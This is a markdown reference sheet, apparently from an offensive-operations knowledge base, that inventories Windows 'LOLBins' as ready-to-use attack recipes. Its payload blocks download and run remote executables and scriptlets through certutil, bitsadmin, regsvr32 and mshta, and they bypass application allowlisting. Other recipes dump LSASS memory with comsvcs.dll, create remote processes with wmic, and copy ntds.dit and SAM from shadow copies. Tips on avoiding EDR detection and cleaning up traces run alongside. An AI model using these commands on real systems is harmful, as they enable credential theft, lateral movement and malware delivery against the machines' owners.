# LOLBins — Inventory & Recipes
_Last updated: 2026-06-22_

Signed Microsoft binaries already on every Windows box, used for non-default purposes. The native operator's toolbox — these ARE the tools, since you can't install any. All Tier 0. Sibling to `telemetry-awareness.md` (which covers the *logging/awareness* side).

## Index
| # | LOLBin | Primary abuse | When | Tier | Tags |
|---|--------|---------------|------|------|------|
| T1 | certutil | Download / base64 encode-decode / hash | Need to fetch or encode without curl | 0-native | lolbin, download, telemetry-awareness |
| T2 | bitsadmin / Start-BitsTransfer | Background download | Resilient file transfer | 0-native | lolbin, download |
| T3 | rundll32 | Execute DLL export / JS | Run code via a signed proxy | 0-native | lolbin, execution |
| T4 | regsvr32 | Scriptlet exec (squiblydoo) | Run remote scriptlet, AWL bypass | 0-native | lolbin, execution, telemetry-awareness |
| T5 | mshta | Run HTA / inline VBScript-JScript | Execute markup-hosted script | 0-native | lolbin, execution |
| T6 | msbuild / installutil | Compile-and-run inline C# | Run C# without dropping an .exe | 0-native | lolbin, execution, dotnet |
| T7 | comsvcs.dll MiniDump | LSASS dump | Credential access (see cred-access T1) | 0-native | lolbin, cred-access |
| T8 | wmic | Query / remote process | Recon + lateral on older boxes | 0-native | lolbin, recon, lateral |
| T9 | esentutl / vssadmin / wbadmin | Locked-file copy | Grab SAM/ntds.dit/locked configs | 0-native | lolbin, cred-access |

## Techniques

### T1: certutil — download / encode / hash
Tags: lolbin, download, telemetry-awareness
When: Need to fetch a file or encode a payload where `curl`/`Invoke-WebRequest` is blocked or logged differently.
Why: `certutil` is a signed cert utility that also downloads URLs and does base64 — a one-stop transfer + encode tool present everywhere.
Tier: 0-native
Payload:
```cmd
certutil -urlcache -split -f http://host/x.exe C:\Temp\x.exe   :: download
certutil -encode in.bin out.b64                                :: base64 encode
certutil -decode out.b64 in.bin                                :: decode
certutil -hashfile C:\Temp\x.exe SHA256                        :: hash
```
Signal: file present / encoded. | Pitfall: `certutil` download is heavily signatured by EDR — expect an alert; for authorized work that's fine (note it), but `bitsadmin`/`Invoke-WebRequest` may be quieter.
Source: distilled LOLBin recipe — 2026-06-22

### T2: bitsadmin / Start-BitsTransfer — background download
Tags: lolbin, download
When: Resilient/quiet transfer.
Why: BITS is the Windows update transfer service — using it to fetch a file blends with normal traffic and survives reboots.
Tier: 0-native
Payload:
```powershell
Start-BitsTransfer -Source http://host/x.exe -Destination C:\Temp\x.exe
```
```cmd
bitsadmin /transfer j /download /priority high http://host/x.exe C:\Temp\x.exe
```
Signal: file downloaded. | Pitfall: BITS jobs persist; clean them up (`bitsadmin /reset`).
Source: distilled LOLBin recipe — 2026-06-22

### T3: rundll32 — execute DLL export / JS
Tags: lolbin, execution
When: Run a DLL export or inline JS via a signed proxy (also the comsvcs LSASS path).
Why: `rundll32` runs any DLL's exported function — used for legitimate plumbing, so it's a quiet exec proxy. Also runs JS via the (legacy) `javascript:` moniker.
Tier: 0-native
Payload:
```cmd
rundll32.exe C:\Temp\evil.dll,EntryPoint
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc");
```
Signal: the export/JS runs. | Pitfall: the `javascript:` technique is patched on modern builds — confirm before relying on it.
Source: distilled LOLBin recipe — 2026-06-22

### T4: regsvr32 — scriptlet exec (squiblydoo)
Tags: lolbin, execution, telemetry-awareness
When: Application-allowlist (AppLocker/WDAC) bypass via a remote scriptlet.
Why: `regsvr32` can register a remote `.sct` scriptlet, executing its script content — a signed binary running attacker script, bypassing many allowlists.
Tier: 0-native
Payload:
```cmd
regsvr32 /s /n /u /i:http://host/file.sct scrobj.dll
```
Signal: scriptlet executes. | Pitfall: well-known ("squiblydoo"), signatured; needs network egress to fetch the `.sct`.
Source: distilled LOLBin recipe — 2026-06-22

### T5: mshta — run HTA / inline script
Tags: lolbin, execution
When: Execute markup-hosted VBScript/JScript.
Why: `mshta` runs HTML Applications and inline script — another signed script-exec proxy.
Tier: 0-native
Payload:
```cmd
mshta http://host/x.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c calc"":close")
```
Signal: script runs. | Pitfall: heavily monitored; `mshta` spawning `cmd`/`powershell` is a classic detection.
Source: distilled LOLBin recipe — 2026-06-22

### T6: msbuild / installutil — compile-and-run inline C#
Tags: lolbin, execution, dotnet
When: Run C# without dropping a compiled `.exe` (e.g., a privesc helper, a token-impersonation helper).
Why: `msbuild` executes inline C# tasks from a project file; `installutil` runs an assembly's uninstall method. Both are signed .NET tools — you bring source, they compile+run. This is how you stay "native" while running C# (combine with `Add-Type` for in-memory compile).
Tier: 0-native
Payload:
```cmd
msbuild.exe payload.xml          :: inline <Task> with C# Code
```
```powershell
Add-Type -TypeDefinition $csharp -Language CSharp   # in-memory compile via in-box Roslyn/csc
```
Signal: the C# runs without a dropped binary. | Pitfall: `Add-Type`/`csc` needs the .NET framework/SDK present (usually is); confirm per the contract.
Source: distilled LOLBin recipe — 2026-06-22

### T7: comsvcs.dll MiniDump — LSASS dump
Tags: lolbin, cred-access
When: Credential access — see `credential-review/credential-review.md#T1` for the full technique.
Why: Cross-referenced here as the canonical credential-dump LOLBin.
Tier: 0-native
Payload: `rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Temp\l.dmp full`
Source: cross-ref credential-review T1 — 2026-06-22

### T8: wmic — query / remote process
Tags: lolbin, recon, lateral
When: Recon and lateral on boxes where `wmic` is still present (deprecated but common).
Why: `wmic` queries WMI and creates remote processes from cmd without PowerShell — useful in constrained shells.
Tier: 0-native
Payload:
```cmd
wmic process list brief
wmic /node:TARGET /user:CORP\u process call create "cmd /c whoami > C:\Temp\o.txt"
wmic service get name,startname,pathname
```
Signal: query results / remote process. | Pitfall: `wmic` is removed on newest Windows builds — fall back to `Get-CimInstance`.
Source: distilled LOLBin recipe — 2026-06-22

### T9: esentutl / vssadmin / wbadmin — locked-file copy
Tags: lolbin, cred-access
When: Copy a locked file (SAM, `ntds.dit`, an open log).
Why: These signed backup/database tools read files the OS has locked — the native way to grab `ntds.dit` off a DC or a busy SAM.
Tier: 0-native
Payload:
```cmd
vssadmin create shadow /for=C:
esentutl /y /vss C:\Windows\NTDS\ntds.dit /d C:\Temp\ntds.dit
```
Signal: locked file copied. | Pitfall: shadow-copy creation is admin-only and logged; clean up the shadow (`vssadmin delete shadows`).
Source: distilled LOLBin recipe — 2026-06-22
